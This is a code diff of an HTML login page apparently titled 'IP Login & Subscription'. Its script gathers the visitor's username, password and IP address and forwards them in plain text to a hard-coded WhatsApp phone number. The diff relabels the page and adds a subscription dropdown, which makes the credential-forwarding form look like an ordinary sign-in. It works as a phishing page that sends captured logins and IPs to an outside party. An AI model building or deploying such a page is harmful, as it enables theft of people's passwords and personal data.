@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Login & WhatsApp Sender</title>
+    <title>IP Login & Subscription</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -20,7 +20,7 @@
             border-radius: 10px;
             box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
         }
-        input, button {
+        input, select, button {
             display: block;
             width: 100%;
             margin: 10px 0;
@@ -40,7 +40,10 @@
         <h1>Login</h1>
         <input type="text" id="username" placeholder="Enter Username">
         <input type="password" id="password" placeholder="Enter Password">
-        <input type="date" id="subscriptionDate" placeholder="Enter Subscription Expiry Date">
+        <select id="subscription">
+            <option value="Monthly">Monthly</option>
+            <option value="Yearly">Yearly</option>
+        </select>
         <button onclick="sendToWhatsApp()">Login</button>
     </div>
     <script>
@@ -57,9 +60,9 @@
         async function sendToWhatsApp() {
             let username = document.getElementById('username').value;
             let password = document.getElementById('password').value;
-            let subscriptionDate = document.getElementById('subscriptionDate').value;
+            let subscription = document.getElementById('subscription').value;
             let ip = await getIP();
-            let message = `Login Details:\nUsername: ${username}\nPassword: ${password}\nIP: ${ip}\nSubscription Expiry: ${subscriptionDate}`;
+            let message = `Login Details:\nUsername: ${username}\nPassword: ${password}\nIP: ${ip}\nSubscription: ${subscription}`;
             let phoneNumber = "+919545689031"; // Replace with your WhatsApp number
             let whatsappUrl = `https://api.whatsapp.com/send?phone=${phoneNumber}&text=${encodeURIComponent(message)}`;
             window.location.href = whatsappUrl;
